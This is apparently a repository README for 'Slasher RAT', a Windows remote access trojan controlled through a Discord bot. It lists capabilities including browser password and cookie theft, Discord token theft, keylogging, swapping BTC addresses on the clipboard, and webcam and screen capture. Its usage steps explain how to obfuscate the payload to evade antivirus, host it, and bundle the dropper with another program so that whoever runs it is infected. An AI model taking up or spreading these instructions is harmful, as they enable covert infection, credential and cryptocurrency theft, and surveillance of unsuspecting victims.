ok# Slasher RAT

- Runs on it's own python installation

- The target only needs python installed on their system for the first run. 

- Still works after the user uninstalls python

- Uses a discord bot for remote access.

# Features
- Live Remote Shell Through Discord Channel
- Chrome, Opera, and Brave Passwords & Cookies Stealer
- Discord Token Stealer
- Keylogger
- BTC Clipboard Address Swapper
- Freeze PC 
- Take Webcam Photo
- Take Screenshot
- Change Wallpaper
- Ip & Geolocation Info Grabber
- Send Custom Alerts (pop-up box)
- Play Custom Text-to-speech messages
- End session with .endsession
  
- Each infected device has a dedicated channel in your discord server!
- **WINDOWS ONLY** (for now...)
  
- **More Features Coming Soon!**
  
# Usage

1. Set the "TOKEN" variable at the top of payload.py to you your discord bot token.

2. In payload.py, change "id" on line 102 to the ID of the server your bot is in.

3. Obfuscate payload.py to avoid AV detections and your bot token being found. reccomended to use [Pyobfuscate](https://pyobfuscate.com))

4. Put embed.py, payload.py, run.vbs and runner.bat in a zip and upload it somewhere to download later.
   
5. In dropper.py, set the "url" variable on line 24 to the download link to your zip file.

6. Obfuscate dropper.py or bundle it with another program! Anybody who runs it will be infected! 
